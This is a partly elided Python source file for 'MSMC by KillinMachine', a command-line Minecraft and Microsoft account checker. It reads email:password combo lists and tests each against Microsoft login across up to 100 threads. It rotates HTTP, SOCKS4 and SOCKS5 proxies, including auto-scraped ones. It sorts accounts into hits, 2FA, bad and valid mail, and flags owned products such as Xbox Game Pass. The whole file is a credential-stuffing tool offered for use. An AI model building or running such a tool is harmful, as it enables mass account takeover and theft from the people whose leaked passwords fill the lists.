import requests, re, os, time, threading, random, urllib3, configparser, json, concurrent.futures, traceback, warnings, uuid, socket, socks, sys, argparse
...
class Capture:
    ...
    def handle(self):
        global hits
        hits+=1
        if screen == "log": print(Fore.GREEN+f"Hit: {self.name} | {self.email}:{self.password}")
    ...
    while tries < maxretries:
        try:
            ...
            if '#' in login_request.url and login_request.url != sFTTag_url:
                ...
                checked+=1
                cpm+=1
                if screen == "log": print(Fore.MAGENTA+f"2FA: {email}:{password}")
                ...
                checked+=1
                cpm+=1
                if screen == "log": print(Fore.RED+f"Bad: {email}:{password}")
                return "None", session
            else:
                session.proxy = getproxy()
                retries+=1
...
def validmail(email, password):
    ...
    if screen == "log": print(Fore.LIGHTMAGENTA_EX+f"Valid Mail: {email}:{password}")
    ...
    while True:
        ...
        if checkrq.status_code == 200:
            if 'product_game_pass_ultimate' in checkrq.text:
                ...
                cpm+=1
                checked+=1
                if screen == "log": print(Fore.LIGHTGREEN_EX+f"Xbox Game Pass Ultimate: {email}:{password}")
                ...
                cpm+=1
                checked+=1
                if screen == "log": print(Fore.LIGHTGREEN_EX+f"Xbox Game Pass: {email}:{password}")
                ...
                if others != []:
                    ...
                    if screen == "log": print(Fore.YELLOW+f"Other: {email}:{password} | {items}")
                    return True
                else:
                    return False
...
def Load(filepath):
    ...
    if not os.path.exists(filepath):
        print(Fore.LIGHTRED_EX+f"Error: Combo file '{filepath}' not found.")
        sys.exit(1)
    ...
    try:
        ...
        print(Fore.LIGHTRED_EX+f"Error reading combo file: {ex}")
        sys.exit(1)

def Proxys(filepath):
    global proxylist
    if not os.path.exists(filepath):
        print(Fore.LIGHTRED_EX+f"Error: Proxy file '{filepath}' not found.")
        sys.exit(1)
    ...
    try:
        ...
        print(Fore.LIGHTBLUE_EX+f"Loaded [{len(proxylist)}] proxies.")
    except Exception as ex:
        print(Fore.LIGHTRED_EX+f"Error reading proxy file: {ex}")
        sys.exit(1)
...
def getproxy():
    if proxytype == "auto": return random.choice(proxylist)
    if proxytype != "none": 
        proxy = random.choice(proxylist)
        if proxytype  == "http": return {'http': 'http://'+proxy, 'https': 'http://'+proxy}
        elif proxytype  == "socks4": return {'http': 'socks4://'+proxy,'https': 'socks4://'+proxy}
        elif proxytype  == "socks5": return {'http': 'socks5://'+proxy,'https': 'socks5://'+proxy}
    else: return None
...
def Checker(combo):
    ...
    try:
        ...
        if email != "" and password != "":
            ...
            if screen == "log": print(Fore.RED+f"Bad: {combo.strip()}")
            bad+=1
            cpm+=1
            checked+=1
    except:
...
def get_proxies():
    ...
    if screen == "log": print(Fore.LIGHTBLUE_EX+f'Scraped [{len(proxylist)}] proxies')
    time.sleep(config.get('autoscrape') * 60)
    get_proxies()

def banproxyload(filepath):
    global banproxies
    if not os.path.exists(filepath):
        print(Fore.LIGHTRED_EX+f"Error: Ban proxy file '{filepath}' not found.")
        sys.exit(1)
    ...
    try:
        ...
        print(Fore.LIGHTBLUE_EX+f"Loaded [{len(banproxies)}] ban check proxies.")
    except Exception as ex:
        print(Fore.LIGHTRED_EX+f"Error reading ban proxy file: {ex}")
        sys.exit(1)
...
def Main():
    ...
    parser = argparse.ArgumentParser(
        description='MSMC - Minecraft Account Checker (CLI Mode)',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  python MSMC_CLI.py -f combos.txt
  python MSMC_CLI.py -f combos.txt -p proxies.txt -t 100 --proxy-type socks5
  python MSMC_CLI.py -f combos.txt --proxy-type auto -t 50 --screen cui
        '''
    )
    
    parser.add_argument('-f', '--combo-file', required=True, help='Path to combo file (email:password format)')
    parser.add_argument('-p', '--proxy-file', help='Path to proxy file (optional)')
    parser.add_argument('-b', '--ban-proxy-file', help='Path to SOCKS5 ban checking proxy file (optional)')
    parser.add_argument('-t', '--threads', type=int, default=100, help='Number of threads (default: 100)')
    parser.add_argument('--proxy-type', choices=['http', 'socks4', 'socks5', 'none', 'auto'], 
                        default='none', help='Proxy type (default: none)')
    parser.add_argument('--screen', choices=['cui', 'log'], default='log', 
                        help='Display mode: cui (full screen) or log (line by line) (default: log)')
    
    args = parser.parse_args()
    
    utils.set_title("MSMC by KillinMachine - CLI Mode")
    print(logo)
    ...
    print(Fore.LIGHTBLUE_EX+f"Threads: {thread}")
    print(Fore.LIGHTBLUE_EX+f"Proxy Type: {proxytype}")
    print(Fore.LIGHTBLUE_EX+f"Screen Mode: {screen}")
    
    # Load combos
    print(Fore.LIGHTBLUE_EX+f"Loading combos from: {args.combo_file}")
    Load(args.combo_file)
    
    # Load proxies if needed
    if proxytype != "none" and proxytype != "auto":
        if args.proxy_file:
            print(Fore.LIGHTBLUE_EX+f"Loading proxies from: {args.proxy_file}")
            Proxys(args.proxy_file)
        else:
            print(Fore.RED+"Error: Proxy file required when using proxy type other than 'none' or 'auto'")
            sys.exit(1)
    
    # Load ban check proxies if needed
    if config.get('proxylessban') == False and config.get('hypixelban') is True:
        if args.ban_proxy_file:
            print(Fore.LIGHTBLUE_EX+f"Loading ban check proxies from: {args.ban_proxy_file}")
            banproxyload(args.ban_proxy_file)
    
    # Auto scrape proxies if needed
    if proxytype == "auto":
    ...
    if screen == "cui": cuiscreen()
    elif screen == "log": logscreen()
